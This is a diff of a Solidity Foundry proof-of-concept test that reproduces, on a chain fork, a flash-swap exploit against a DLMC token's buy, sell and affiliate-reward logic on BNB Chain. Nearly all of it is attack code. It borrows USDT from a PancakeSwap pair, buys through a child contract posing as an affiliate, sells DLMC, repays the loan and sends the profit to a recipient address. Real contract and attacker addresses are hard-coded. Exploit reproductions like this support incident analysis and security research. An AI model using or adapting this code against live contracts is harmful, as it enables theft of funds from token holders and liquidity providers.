@@ -20,55 +20,52 @@ import "./Base.sol";
 // @POC Author
 // Generated PoC
 
-library Addresses {
-    address internal constant Cake_LP = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
-    address internal constant attack_path_entry = 0x4adbDDEA5781cAccADD9F73f00E07201b541414e;
-    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
-    address internal constant A_62CEFE_D792 = 0x62cefE76EEcc737D7ee384eFDbAd8D2C53c1d792;
-    address internal constant A_701BB7_9699 = 0x701Bb7B460ae231DBBcFA3d87f0aB5B458429699;
-    address internal constant attacker_eoa = 0x74c4A756933D0F713FAcB1DeA325eF511646c3B1;
-    address internal constant attack_child = 0x8B5A72C4ce0d3a7676ce06B8E42AeB255bBa476e;
-    address internal constant created_attack_contract_0A04 = 0xE81Bf6E392ECa9aD594B5452ea53cF7071760a04;
-    address internal constant DLMC = 0xF2ca2A3572B26Ae7c479dC7ae36D922113B1bdF2;
-}
-
-interface IDLMC {
-    function buy(uint256 amount) external;
-    function livePrice() external view returns (uint256);
-    function registerAffiliate(address affiliate) external;
-    function sell(uint256 amount) external;
-    function buy() external;
-}
-
 contract AttackTest is Base {
     address constant ATTACKER_EOA = Addresses.attacker_eoa;
     address constant ATTACK_CONTRACT = Addresses.attack_path_entry;
+    uint256 constant FORK_BLOCK = 106091606;
     uint256 constant TX_TIMESTAMP = 1782299710;
     uint256 constant TX_BLOCK_NUMBER = 106091607;
     uint256 constant TX_VALUE = 0;
 
+    uint64 constant ATTACKER_EOA_TX_NONCE = 0;
+
     function setUp() public {
         vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
-        vm.warp(TX_TIMESTAMP);
-        vm.roll(TX_BLOCK_NUMBER);
+        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
+        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
     }
 
     function testPoC() public {
         vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
-
-        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
-        vm.setNonce(ATTACK_CONTRACT, 1);
-
-        OurAttack attack = OurAttack(payable(ATTACK_CONTRACT));
-        attack._deployAttackChild();
-        _prepareProfit(address(attack), address(attack.attackChild()));
-
+        OurAttack attack = _deployAttack();
+        _prepareProfit(attack);
         _logBalances("Before exploit");
         attack.attack{value: TX_VALUE}();
         _logBalances("After exploit");
-
         vm.stopPrank();
         _assertProfit();
+    }
+
+    function _deployAttack() internal returns (OurAttack attack) {
+        _alignNonce();
+        attack = new OurAttack();
+        require(address(attack) == ATTACK_CONTRACT, "unexpected attack contract");
+    }
+
+    function _alignNonce() internal {
+        uint64 currentNonce = vm.getNonce(ATTACKER_EOA);
+        if (currentNonce < ATTACKER_EOA_TX_NONCE) {
+            vm.setNonce(ATTACKER_EOA, ATTACKER_EOA_TX_NONCE);
+        }
+    }
+
+    function _prepareProfit(OurAttack attack) internal {
+        _prepareProfit(address(attack), _expectedAttackChild(attack));
+    }
+
+    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
+        return address(attack.primaryChild());
     }
 
     function _expectProfitLegs(address attack, address attackChild) internal override {
@@ -80,132 +77,151 @@ contract AttackTest is Base {
 }
 
 contract OurAttack {
-    bytes4 private constant START_ATTACK = bytes4(0x16521e5a);
-
-    AttackChild_1 public attackChild;
+    AttackChild_1 public primaryChild;
 
     constructor() payable {
-        _deployAttackChild();
+        primaryChild = new AttackChild_1();
+        require(address(primaryChild) == Addresses.created_attack_contract_0A04, "unexpected attack child");
+    }
+
+    function attack() public payable {
+        (bool ok,) = address(primaryChild)
+            .call(
+                abi.encodeWithSelector(
+                    bytes4(0x16521e5a),
+                    uint256(420000000000000000000000),
+                    uint256(1000000000000000000000000),
+                    uint256(0x000000000000000000000000701bb7b460ae231dbbcfa3d87f0ab5b458429699)
+                )
+            );
+        require(ok, "primary child entry failed");
     }
 
     receive() external payable {}
 
-    fallback() external payable {}
-
-    function attack() public payable {
-        (bool ok,) = address(attackChild)
-            .call(
-                abi.encodeWithSelector(
-                    START_ATTACK,
-                    uint256(420000000000000000000000),
-                    uint256(1000000000000000000000000),
-                    Addresses.A_701BB7_9699
-                )
-            );
-        require(ok, "attack child dispatch failed");
-    }
-
-    function _deployAttackChild() public returns (address) {
-        if (address(attackChild) != address(0)) return address(attackChild);
-
-        attackChild = new AttackChild_1();
-        require(address(attackChild) == Addresses.created_attack_contract_0A04, "unexpected attack child");
-        return address(attackChild);
+    fallback() external payable {
+        if (msg.data.length == 0) return;
     }
 }
 
 contract AttackChild {
-    bytes4 private constant BUY_WITH_USDT = bytes4(0xa2608d86);
-
     receive() external payable {}
 
     fallback() external payable {
         if (msg.data.length == 0) return;
-        if (msg.sig == BUY_WITH_USDT) {
-            (address dlmc, address usdt, address affiliate, uint256 buyAmount) =
+        if (msg.sig == 0xa2608d86) {
+            (address market, address token, address affiliate, uint256 buyAmount) =
                 abi.decode(msg.data[4:], (address, address, address, uint256));
-            buyWithApprovedUsdt(dlmc, usdt, affiliate, buyAmount);
+            buyWithApproval(market, token, affiliate, buyAmount);
             return;
         }
-        revert("unsupported helper call");
     }
 
-    function buyWithApprovedUsdt(address dlmc, address usdt, address affiliate, uint256 buyAmount) public payable {
-        IDLMC(dlmc).registerAffiliate(affiliate);
-        IERC20Like(usdt).approve(dlmc, type(uint256).max);
-        IDLMC(dlmc).buy(buyAmount);
+    function buyWithApproval(address market, address token, address affiliate, uint256 buyAmount) public payable {
+        IDLMC(market).registerAffiliate(affiliate);
+        IERC20Like(token).approve(market, type(uint256).max);
+        IDLMC(market).buy(buyAmount);
     }
+
+    function _prepareAttackChild() public {}
 }
 
 contract AttackChild_1 {
-    bytes4 private constant START_ATTACK = bytes4(0x16521e5a);
-    bytes4 private constant BUY_WITH_USDT = bytes4(0xa2608d86);
-
-    bool private callbackComplete;
-    uint256 private firstBuyAmount;
-    uint256 private helperBuyAmount;
-    address private profitRecipient;
+    bool private flashCallbackHandled;
 
     receive() external payable {}
-
-    fallback() external payable {
-        if (msg.data.length == 0) return;
-        if (msg.sig == START_ATTACK) {
-            (uint256 firstAmount, uint256 helperAmount, address recipient) =
-                abi.decode(msg.data[4:], (uint256, uint256, address));
-            executeSwap(firstAmount, helperAmount, recipient);
-            return;
-        }
-        revert("unsupported attack call");
-    }
 
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external payable {
         sender;
         amount0;
         amount1;
         data;
-        flashCallback();
+        if (!flashCallbackHandled) flashCallback2();
+        return;
     }
 
-    function flashCallback() public payable {
-        if (callbackComplete) return;
-        callbackComplete = true;
-
-        IDLMC(Addresses.DLMC).registerAffiliate(Addresses.A_62CEFE_D792);
-        IERC20Like(Addresses.USDT).approve(Addresses.DLMC, type(uint256).max);
-        IDLMC(Addresses.DLMC).buy(firstBuyAmount);
-
-        AttackChild affiliateBuyer = new AttackChild();
-        require(address(affiliateBuyer) == Addresses.attack_child, "unexpected attack child");
-
-        IERC20Like(Addresses.USDT).transfer(address(affiliateBuyer), helperBuyAmount);
-        (bool ok,) = address(affiliateBuyer)
-            .call(abi.encodeWithSelector(BUY_WITH_USDT, Addresses.DLMC, Addresses.USDT, address(this), helperBuyAmount));
-        require(ok, "affiliate buy failed");
-
-        IDLMC(Addresses.DLMC).livePrice();
-        IERC20Like(Addresses.DLMC).balanceOf(address(this));
-        IERC20Like(Addresses.USDT).balanceOf(Addresses.DLMC);
-
-        IDLMC(Addresses.DLMC).sell(65908685295332365480640);
-        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, 1423558897243107769423559);
-
-        uint256 profitTokenBalance = IERC20Like(Addresses.USDT).balanceOf(address(this));
-        IERC20Like(Addresses.USDT).transfer(profitRecipient, profitTokenBalance);
+    fallback() external payable {
+        if (msg.data.length == 0) return;
+        if (msg.sig == 0x16521e5a) {
+            _executeSwapPath();
+            return;
+        }
     }
 
-    function executeSwap(uint256 firstAmount, uint256 helperAmount, address recipient) internal {
-        firstBuyAmount = firstAmount;
-        helperBuyAmount = helperAmount;
-        profitRecipient = recipient;
+    function swapPath() external payable {
+        _executeSwapPath();
+        return;
+    }
 
-        // They are modeled here as normal Solidity state assignment; no trace-backed protocol call exists.
+    function flashCallback() external payable {
+        if (!flashCallbackHandled) flashCallback2();
+        return;
+    }
+
+    function _executeSwapPath() internal {
+        // Structured gap: action_0004..0006 are observed storage writes with no normal trace-backed call.
         IUniswapV2PairLike(Addresses.Cake_LP)
             .swap(
-                firstAmount + helperAmount,
+                1420000000000000000000000,
                 0,
                 Addresses.created_attack_contract_0A04,
                 hex"0000000000000000000000000000000000000000000000000000000000000001"
             );
     }
+
+    function flashCallback2() internal {
+        flashCallbackHandled = true;
+        IDLMC(Addresses.DLMC).registerAffiliate(Addresses.A_62CEFE_D792);
+        IERC20Like(Addresses.USDT).approve(Addresses.DLMC, type(uint256).max);
+        IDLMC(Addresses.DLMC).buy(420000000000000000000000);
+        AttackChild attackChild = new AttackChild();
+        require(address(attackChild) == Addresses.attack_child, "unexpected attack child");
+        attackChild._prepareAttackChild();
+        IERC20Like(Addresses.USDT).transfer(address(attackChild), 1000000000000000000000000);
+        (bool ok,) = address(attackChild)
+            .call(
+                abi.encodeWithSelector(
+                    bytes4(0xa2608d86),
+                    Addresses.DLMC,
+                    Addresses.USDT,
+                    Addresses.created_attack_contract_0A04,
+                    uint256(1000000000000000000000000)
+                )
+            );
+        require(ok, "secondary child buy failed");
+        IDLMC(Addresses.DLMC).livePrice();
+        IERC20Like(Addresses.DLMC).balanceOf(address(this));
+        IERC20Like(Addresses.USDT).balanceOf(Addresses.DLMC);
+        uint256 dlmcSellAmount = 65908685295332365480640;
+        IDLMC(Addresses.DLMC).sell(dlmcSellAmount);
+        uint256 pairRepayment = 1423558897243107769423559;
+        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, pairRepayment);
+        uint256 profitAmount = IERC20Like(Addresses.USDT).balanceOf(address(this));
+        IERC20Like(Addresses.USDT).transfer(Addresses.A_701BB7_9699, profitAmount);
+    }
+}
+
+library Addresses {
+    address internal constant ZERO = address(0);
+    address internal constant Cake_LP = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
+    address internal constant attack_path_entry = 0x4adbDDEA5781cAccADD9F73f00E07201b541414e;
+    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
+    address internal constant A_61E7F1_BCF5 = 0x61e7f1D43567E380ea5B4E7Ac81d6FFEbF1BBCF5;
+    address internal constant A_62CEFE_D792 = 0x62cefE76EEcc737D7ee384eFDbAd8D2C53c1d792;
+    address internal constant A_701BB7_9699 = 0x701Bb7B460ae231DBBcFA3d87f0aB5B458429699;
+    address internal constant attacker_eoa = 0x74c4A756933D0F713FAcB1DeA325eF511646c3B1;
+    address internal constant attack_child = 0x8B5A72C4ce0d3a7676ce06B8E42AeB255bBa476e;
+    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+    address internal constant created_attack_contract_0A04 = 0xE81Bf6E392ECa9aD594B5452ea53cF7071760a04;
+    address internal constant DLMC = 0xF2ca2A3572B26Ae7c479dC7ae36D922113B1bdF2;
+    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
+}
+
+interface IDLMC {
+    function buy(uint256) external;
+    function livePrice() external view returns (uint256);
+    function registerAffiliate(address) external;
+    function sell(uint256) external;
+    function buy() external;
 }
